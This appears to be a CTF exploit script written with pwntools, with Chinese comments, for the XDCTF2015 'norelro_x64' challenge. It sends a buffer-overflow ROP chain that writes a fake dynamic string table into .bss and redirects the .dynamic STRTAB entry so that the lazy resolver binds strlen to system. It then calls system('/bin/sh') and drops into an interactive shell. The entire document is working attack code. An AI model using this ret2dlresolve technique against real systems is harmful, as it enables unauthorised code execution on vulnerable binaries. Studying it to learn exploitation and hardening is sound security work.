from pwn import *  
context(os='linux',arch='amd64',log_level='debug')

r = process('./norelro_x64')  
elf = ELF('./norelro_x64')  
read_plt = elf.plt['read']  
#我们攻击的目标，.dynamic中strtab的地址，我们要在此处修改指向fake_dynstr  
target_addr = 0x600988 + 8  
#用于加载函数地址的函数，当我们伪造了dynstr后，再次调用即可加载我们需要的函数  
plt0_load = 0x4004D0   
#pop rdi;ret;  
pop_rdi = 0x400773 
#pop rsi ; pop r15 ; ret  
pop_rsi = 0x400771
#伪造dynstr  
fake_dynstr = '\x00libc.so.6\x00stdin\x00system\x00' #原本dynstr为\x00libc.so.6\x00stdin\x00strlen\x00'
bss = 0x600B30  

payload = flat('a' * 120 , pop_rdi , 0 , pop_rsi , bss , 0 , read_plt , # 将'/bin/sh'以及伪造的strtab写入bss段
                pop_rdi , 0 , pop_rsi , target_addr , 0 , read_plt , # 将.dynamic中的strtab地址改为我们伪造的strtab的地址
                pop_rdi , bss , plt0_load , 1 # 调用.dl_fixup,解析strlen函数，由于我们已经在fake_strtab中将strlen替换成system，所以将会解析system函数

)

r.recvuntil('Welcome to XDCTF2015~!\n')
r.sendline(payload)  
#发送system的参数以及伪造的strtab
payload2 = '/bin/sh'.ljust(0x10,'\x00') + fake_dynstr  
sleep(1)  
r.sendline(payload2)  
sleep(1)  
#修改dynsym里的strtab的地址为我们伪造的dynstr的地址  
r.sendline(p64(bss + 0x10))  
r.interactive()  